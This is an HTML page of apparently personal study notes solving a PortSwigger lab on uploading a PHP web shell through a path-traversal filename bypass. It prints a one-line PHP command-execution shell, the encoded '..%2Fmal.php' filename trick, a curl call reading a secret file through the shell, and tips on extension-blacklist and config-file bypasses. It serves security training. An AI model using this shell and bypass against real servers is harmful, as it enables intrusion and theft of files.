<!DOCTYPE html>
<html lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
<title>1f3 - Web shell upload via Path Traversal \[PortSwigger Lab] :: user@cybrealm:~$</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="description" content="This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.
To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret.
You can log in to your own account using the following credentials: wiener:peter
Solution: So, User&rsquo;s page includes avatar upload function. just to upload mal.php with contents &lt;?php echo system($_GET[&#39;command&#39;]); ?&gt; will just return plaintext version of this script.
" />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f3-web-shell-upload-via-path-traversal-portswigger-lab/" />
<meta property="og:locale" content="en" />
<meta property="og:title" content="1f3 - Web shell upload via Path Traversal \[PortSwigger Lab] :: user@cybrealm:~$" />
<meta property="og:description" content="This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.
To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret.
You can log in to your own account using the following credentials: wiener:peter
Solution: So, User&rsquo;s page includes avatar upload function. just to upload mal.php with contents &lt;?php echo system($_GET[&#39;command&#39;]); ?&gt; will just return plaintext version of this script.
" />
  <meta property="og:type" content="article" />
    <meta property="article:published_time" content="2024-07-09 00:00:00 &#43;0000 UTC" />
    <meta property="article:modified_time" content="2024-07-09 00:00:00 UTC" />
  <meta property="article:author" content="user@cybrealm:~$" />
<meta property="og:url" content="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f3-web-shell-upload-via-path-traversal-portswigger-lab/" />
<meta property="og:site_name" content="user@cybrealm:~$" />
<meta property="og:image" content="" />
<meta property="og:image:width" content="2048" />
<meta property="og:image:height" content="1024" />
<link rel="shortcut icon" href="" />
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  href="https://fonts.googleapis.com/css2?family=Fira+Sans:ital,wght@0,300;0,400;0,500;1,300;1,400;1,500&family=Roboto+Slab:wght@300;400;500&family=Ubuntu+Mono:ital@0;1&display=swap"
  rel="stylesheet"
/>
<link href="/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f3-web-shell-upload-via-path-traversal-portswigger-lab/" rel="alternate" type="application/rss+xml" title="user@cybrealm:~$" />
<link rel="stylesheet" href="http://localhost:1313/styles.css" />
</head>

  <body>
    <div class="theme-container">
      <div class="container center">
        <header class="site-header">
<nav class="navbar">
  <div class="navbar__first">
    <ul class="navbar__list borders">
      <li><a href="http://localhost:1313/">Home</a></li>
      <li>
        <button class="theme-toggle transparent"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>
</button>
      </li>
    </ul>
  </div>
  <div class="navbar__separator"></div>
</nav>
</header>
        <main class="site-main"><article class="post">
    <header class="post-header">
        <h1 class="post-title"><a href="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f3-web-shell-upload-via-path-traversal-portswigger-lab/">1f3 - Web shell upload via Path Traversal [PortSwigger Lab]</a></h1>
        <div class="post-meta">
            <time pubdate datetime="2024-07-09 00:00:00 UTC">
              Published on
              2024-07-09 00:00:00 UTC
            </time>
            <time pubdate datetime="2024-07-09 00:00:00 UTC"> last modified 2024-07-09 00:00:00 UTC. </time>
        </div>
    </header>
      <div class="post-content">
        <p>This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.</p>
<p>To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file <code>/home/carlos/secret</code>. Submit this secret.</p>
<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>

<h3 id="solution">
  Solution:
  <a href="#solution" class="hanchor" ariaLabel="Anchor"></a>
</h3>
<p>So, User&rsquo;s page includes avatar upload function. just to upload <code>mal.php</code> with contents <code>&lt;?php echo system($_GET['command']); ?&gt;</code> will just return plaintext version of this script.</p>

  <figure class="left">
    <img src="/.gitbook/assets/Pasted%20image%2020240720173537.png"   />
  </figure>

<p>it also seems that uploading <code>mal.php</code> with path traversal <code>../mal.php</code> still uploads it to <code>files/avatars/mal.php</code>, which means that it&rsquo;s cutting traversals in path.</p>

  <figure class="left">
    <img src="/.gitbook/assets/Pasted%20image%2020240720173821.png"   />
  </figure>

<p>So all I had to do was obfuscating the path traversal to <code>..%2Fmal.php</code> which is same as <code>../mal.php</code>.</p>
<p>after changing a filename to this parameter and uploading it we get the following response</p>

  <figure class="left">
    <img src="/.gitbook/assets/uploaded.png"   />
  </figure>

<p>so the file is uploaded to <code>files/mal.php</code></p>
<p>now we can just call this script using [[1a1b - cURL|cURL]] to get the response</p>

<div class="highlight-wrapper">
  <div class="highlight-toolbar">
    <span class="item">
      <span class="label">Lang:</span>
      <span class="name"></span>
    </span>


    <button class="item right outline brighter hide js-btn-copy-code">Copy</button>
  </div><pre tabindex="0"><code>curl -X GET &#34;https://0a3c00e4049c901c802ee994009d003a.web-security-academy.net/files/mal.php?command=cat%20/home/carlos/secret&#34;


jziR****************************jziR****************************</code></pre></div>
<p>The secret: jziR****************************</p>
<hr>
<p>Another obvious way to prevent users from uploading certain files is to blacklist these file extensions like <code>php</code>. This practice is still flawed since its difficult to explicitly blacklist every file that can be executed. such blacklists can be sometimes bypassed using lesser known, alternative file extensions like <code>.php5</code> or <code>.shtml</code> and so on.</p>
<p>As previously mentioned, some servers won&rsquo;t let certain files to execute unless they are explicitly configured to do that.</p>
<p>As an example, before Apache server lets PHP files to execute, a developer might put something like the following in their <code>/etc/apache2/apache2.conf</code> file:</p>

<div class="highlight-wrapper">
  <div class="highlight-toolbar">
    <span class="item">
      <span class="label">Lang:</span>
      <span class="name"></span>
    </span>


    <button class="item right outline brighter hide js-btn-copy-code">Copy</button>
  </div><pre tabindex="0"><code>LoadModule php_module /usr/lib/apache2/modules/libphp.so
	AddType application/x-httpd-php .php</code></pre></div>
<p>Many servers also allow developers to create special config-files within individual directories to override global configuration parameters. Apache-specific servers for example will load directory-specific configuration from a file called <code>.htaccess</code>.</p>
<p>Similarly, directory-specific configuration can be made on IIS server using <code>web.config</code> file. This might include directives such as the following, where server only allows JSON files to be served to users:</p>

<div class="highlight-wrapper">
  <div class="highlight-toolbar">
    <span class="item">
      <span class="label">Lang:</span>
      <span class="name"></span>
    </span>


    <button class="item right outline brighter hide js-btn-copy-code">Copy</button>
  </div><pre tabindex="0"><code>&lt;staticContent&gt; 
	&lt;mimeMap fileExtension=&#34;.json&#34; mimeType=&#34;application/json&#34; /&gt; 
	&lt;/staticContent&gt;</code></pre></div>
<p>Web servers use these kinds of configuration files when present, but you&rsquo;re not normally allowed to access them using HTTP requests.</p>
<p>However, you may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable type.</p>

      </div>


    <footer class="post-footer">
    </footer>
  </article>
        </main>
        <footer class="site-footer">
<p class="buildinfo">
  <time datetime="2025-11-27 21:40:09 &#43;04">Site built on: 2025-11-27 21:40:09 &#43;04</time>
</p>
<div class="copyright">
  <p></p>
  <nav class="navbar">
    <ul class="navbar__list">
      <li><a href="http://localhost:1313/posts/index.xml">RSS</a></li>
      <li><a href="http://localhost:1313/sitemap.xml">Sitemap</a></li>
    </ul>
  </nav>
</div>
<p class="themeinfo">Powered by <a href="https://gohugo.io">Hugo</a>, using theme <a href="https://manid2.github.io/hugo-xterm/">Hugo Xterm</a>.</p>
</footer>
      </div>
    </div><script type="text/javascript" src="/bundle.js"></script>
</body>
</html>
